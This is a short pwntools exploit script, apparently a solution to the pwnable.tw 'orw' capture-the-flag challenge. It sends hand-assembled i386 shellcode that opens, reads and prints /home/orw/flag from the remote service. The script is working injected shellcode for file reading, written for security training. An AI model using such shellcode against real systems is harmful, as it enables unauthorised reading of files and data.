from pwn import *

context(arch = 'i386', os = 'linux')

r = remote("chall.pwnable.tw", 10001)
r.recvuntil(':')

shellcode = asm("xor eax, eax")
shellcode += asm("xor ebx, ebx")
shellcode += asm("xor ecx, ecx")
shellcode += asm("xor edx, edx")

shellcode += asm("push eax") 		# '/0'
shellcode += asm("push 0x67616C66") # galf
shellcode += asm("push 0x2F2F7772") # //wr
shellcode += asm("push 0x6F2F2F65") # o//e
shellcode += asm("push 0x6D6F682F") # moh/
shellcode += asm("mov al, 0x5")		# sys_open
shellcode += asm("mov ebx, esp")	# char* filename
shellcode += asm("int 0x80")

shellcode += asm("mov ebx, eax")	# eax holds fd
shellcode += asm("xor eax, eax")
shellcode += asm("mov al, 0x3")		# sys_read
shellcode += asm("mov ecx, esp")	# *buf
shellcode += asm("mov dl, 0x64")	# count = 100 bytes
shellcode += asm("int 0x80")

shellcode += asm("xor eax, eax")
shellcode += asm("xor ebx, ebx")
shellcode += asm("mov al, 0x4")		# sys_write
shellcode += asm("mov bl, 0x1")		# stdout
shellcode += asm("int 0x80")

r.send(shellcode)
r.interactive()